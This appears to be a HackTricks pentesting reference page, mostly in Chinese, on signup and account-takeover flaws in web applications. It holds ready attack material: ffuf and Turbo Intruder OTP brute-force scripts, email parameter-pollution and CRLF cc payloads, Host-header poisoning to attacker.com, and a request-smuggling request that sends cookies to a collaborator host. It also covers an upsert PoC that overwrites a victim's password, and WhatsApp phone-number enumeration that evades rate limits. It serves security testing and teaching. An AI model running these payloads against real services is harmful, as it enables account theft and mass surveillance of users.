# 注册与接管漏洞

{{#include ../banners/hacktricks-training.md}}

## 注册接管

### 重复注册

- 尝试使用已存在的用户名进行注册
- 尝试不同的 email 变体：
- 变更大小写
- +1@
- 在 email 中添加点
- 在 email 名称中使用特殊字符（%00, %09, %20）
- 在 email 后面放置空白字符：`test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- 尝试 email 提供商的规范化技巧（依服务而异）：
- Gmail 会忽略点和子地址：`victim+1@gmail.com`, `v.ic.tim@gmail.com` 会投递到 `victim@gmail.com`
- 一些提供商在本地部分对大小写不敏感
- 一些提供商接受 unicode 混淆字符。尝试在本地部分使用 homoglyphs 和软连字符 `\u00AD`
- 滥用这些技巧可以：绕过唯一性检查、获取重复帐户/workspace 邀请，或在你准备接管时阻止受害者注册（临时 DoS）

### 用户名枚举

检查应用内是否能判断出某个用户名是否已被注册。

- 不同的错误消息或 HTTP status codes
- 时间差异（已存在的用户可能会触发到 IdP/DB 的查找）
- 已知 email 的注册表单自动填充配置文件数据
- 检查团队/邀请流程：输入 email 可能会泄露该账号是否存在

### 密码策略

创建用户时检查密码策略（测试是否可以使用弱密码）。\
在这种情况下，你可以尝试对凭证进行 bruteforce 攻击。

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)了解如何通过 **SQL Injections** 在注册表单中尝试账户接管或提取信息。

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### 更改 Email

注册后尝试更改 email，检查此更改是否得到正确验证，或是否可以改成任意 email。

### 更多检查

- 检查是否可以使用 **disposable emails**（mailinator, yopmail, 1secmail 等）或通过子地址绕过黑名单，例如 `victim+mailinator@gmail.com`
- **超长** **password** (>200) 会导致 **DoS**
- **检查账号创建的 rate limits**
- 使用 username@**burp_collab**.net 并分析 **callback**
- 如果使用手机号码验证，检查 phone parsing/injection 的边缘用例

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### 联系人发现 / 标识符枚举 oracles

以电话号码为中心的 messenger 在客户端同步联系人时会暴露一个 **presence oracle**。重放 WhatsApp 的发现请求在历史上曾达到 **>100M lookups per hour**，使得近乎完整的账号枚举成为可能。

**Attack workflow**

1. 使用官方客户端抓取地址簿上传请求（已认证的、规范化的 E.164 号码 blob）。在重用相同的 cookies/设备令牌时，用攻击者生成的号码重放该请求。
2. **每次请求批量号码**：WhatsApp 接受数千个标识符并返回已注册/未注册信息及元数据（business, companion 等）。离线分析响应以在不向受害者发送消息的情况下构建目标列表。
3. **横向扩展** 枚举，使用 SIM banks、cloud devices 或 residential proxies，使单账号/IP/ASN 的限流永远不会触发。

**拨号计划建模**

对每个国家的拨号计划建模以跳过无效候选项。NDSS dataset（`country-table.*`）列出了国家代码、采用密度和平台分布，便于你优先处理高命中范围。示例种子代码：
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
在查询 oracle 之前，优先选择与实际分配匹配的前缀（Mobile Country Code + National Destination Code），以保持吞吐量有用。

**Turning enumerations into targeted attacks**

- 将 leaked phone numbers（例如 Facebook’s 2021 breach）输入 oracle，以判断在进行 phishing、SIM-swapping 或 spamming 之前哪些身份仍然活跃。
- 按国家/OS/应用类型切分普查数据，以发现 SMS 过滤薄弱或 WhatsApp Business 采用量大的地区，便于进行本地化 social engineering。

**Public-key reuse correlation**

WhatsApp 在会话建立期间会暴露每个账户的 X25519 identity key。对每个 enumerated number 请求 identity material，并对 public keys 去重，以揭示 account farms、cloned clients 或 insecure firmware——共享密钥会去匿名化 multi-SIM 操作。

## Weak Email/Phone Verification (OTP/Magic Link)

注册流程通常通过数值 OTP 或 magic-link token 验证所有权。典型缺陷：

- 可猜测或过短的 OTP（4–6 位），且没有有效的速率限制或 IP/device 跟踪。尝试并行猜测和 header/IP 轮换。
- OTP 在不同操作或账户间复用，或未绑定到特定用户/操作（例如，同一代码可用于 login 和 signup，或在 email 更改后仍然有效）。
- Multi-value smuggling：一些后端接受多个代码并验证是否有任意匹配。尝试：
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle：通过 status/message/body length 区分 wrong vs expired vs wrong-user 代码。
- Tokens 在成功后或在 password/email 更改后未被使无效。
- Verification token 未绑定到 user agent/IP，允许来自攻击者控制页面的跨源完成。

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
并行/并发猜测以绕过顺序锁定（使用 Turbo Intruder 在 Burp 中）：

<details>
<summary>Turbo Intruder 代码片段，用于洪泛 6 位数 OTP 尝试</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

A powerful class of issues occurs when an attacker performs actions on the victim’s email before the victim creates their account, then regains access later.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- Attacker: registers a classic account with victim email and sets a password
- Victim: later signs up with SSO (same email)
- Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
- Attacker: creates account and holds a long‑lived session (don’t log out)
- Victim: recovers/sets password and uses the account
- Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
- Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
- Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
- Attacker: initiates email‑change to attacker mail and withholds confirmation
- Victim: recovers the account and starts using it
- Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
- Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
- Victim: signs up via classic route
- Service merges on email without checking `email_verified` or performing local verification

Practical tips

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Create realistic automation to keep sessions alive while you exercise other flows.
- For SSO tests, stand up a test OIDC provider and issue tokens with `email` claims for the victim address and `email_verified=false` to check if the RP trusts unverified IdPs.
- After any password reset or email change, verify that:
- all other sessions and tokens are invalidated,
- pending email/phone change capabilities are cancelled,
- previously linked IdPs/emails/phones are re‑verified.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. 向你的邮箱请求密码重置
2. 点击密码重置链接
3. 不要更改密码
4. 点击任意第三方网站（例如：Facebook、twitter）
5. 在 Burp Suite 代理中拦截请求
6. 检查 referer header 是否在 leak 密码重置 token。

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. 在 Burp Suite 中拦截密码重置请求
2. 在 Burp Suite 中添加或编辑以下 headers：`Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 使用修改后的 header 转发请求\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. 查找基于 _host header_ 的密码重置 URL，例如：`https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR 在 API 参数 <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Attacker 必须使用他们的账户登录并转到 **Change password** 功能。
2. 启动 Burp Suite 并拦截请求
3. 将其发送到 repeater 选项卡并编辑参数：User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### 弱密码重置令牌 <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

密码重置令牌应每次随机生成且唯一。\
尝试确定令牌是否会过期或是否始终相同，在某些情况下生成算法很弱且可以被猜测。以下变量可能被算法使用。

- 时间戳
- 用户ID
- 用户电子邮件
- 名和姓
- 出生日期
- 加密/密码学
- 仅数字
- 短令牌序列（字符范围在 \[A-Z,a-z,0-9] 之间）
- 令牌重用
- 令牌过期日期

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. 使用 API/UI 触发针对特定电子邮件的密码重置请求，例如: test@mail.com\
2. 检查服务器响应并查看 `resetToken`
3. 然后在 URL 中使用该令牌，例如 `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 在系统上注册一个与受害者用户名相同，但在用户名前后插入空格的用户名。例如：`"admin "`
2. 使用你的恶意用户名请求密码重置。
3. 使用发送到你邮箱的令牌并重置受害者的密码。
4. 使用新密码登录到受害者账户。

The platform CTFd was vulnerable to this attack.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. 在应用或子域中找到 XSS，如果 cookies 被设置为父域范围：`*.domain.com`
2. Leak the current **sessions cookie**
3. 使用该 cookie 以该用户的身份认证

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. 使用 **smuggler** 来检测 HTTP Request Smuggling 的类型（CL, TE, CL.TE）\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 构造一个请求，将 `POST / HTTP/1.1` 覆盖为以下数据：\
`GET http://something.burpcollaborator.net HTTP/1.1 X:`，目的是将受害者重定向到 burpcollab 并窃取他们的 cookies\
3. 最终请求可能如下所示
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### 通过 CSRF 的账户接管 <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. 创建一个用于 CSRF 的 payload，例如: “HTML form with auto submit for a password change”
2. 发送 payload

### 通过 JWT 的账户接管 <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token 可能被用于验证用户。

- 编辑 JWT，将 User ID / Email 修改为其他用户
- 检查弱 JWT 签名

{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset（对已存在邮箱执行 Upsert）

某些 signup 处理器在提供的 email 已存在时会执行 upsert。如果该 endpoint 接受仅包含 email 和 password 的最小请求体，并且不强制验证归属，那么发送受害者的 email 就会在 pre-auth 阶段覆盖他们的 password。

- Discovery：从 bundled JS（或 mobile app 流量）中收集 endpoint 名称，然后使用 ffuf/dirsearch 对类似 /parents/application/v4/admin/FUZZ 的 base paths 进行 fuzz。
- Method hints：当 GET 返回类似 "Only POST request is allowed." 的信息时，通常表明正确的动词是 POST，并且期望一个 JSON body。
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
示例 PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
影响：完全的账户接管 (ATO)，无需任何重置令牌、OTP 或电子邮件验证。

## 参考资料

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
